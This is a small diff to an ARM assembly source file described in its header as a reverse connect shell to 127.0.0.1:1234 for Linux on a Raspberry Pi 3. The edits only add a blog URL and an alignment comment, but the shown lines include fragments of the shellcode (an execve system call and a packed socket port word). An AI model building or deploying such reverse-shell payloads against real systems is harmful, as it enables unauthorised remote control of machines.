@@ -1,6 +1,8 @@
 /**
   reverse connect shell to 127.0.0.1:1234
   tested with linux running on raspberry pi 3  
+  
+  http://modexp.wordpress.com/   
 */
 
     .global _start
@@ -45,7 +47,7 @@ dup_loop:
     eor    r1, r1, r1    // r1 = NULL
     mov    r7, #11       // r7 = execve
     svc    1
-    nop
+    nop                  // alignment by 4 bytes
     nop
 sin_port:    
 .word  0xd2040002
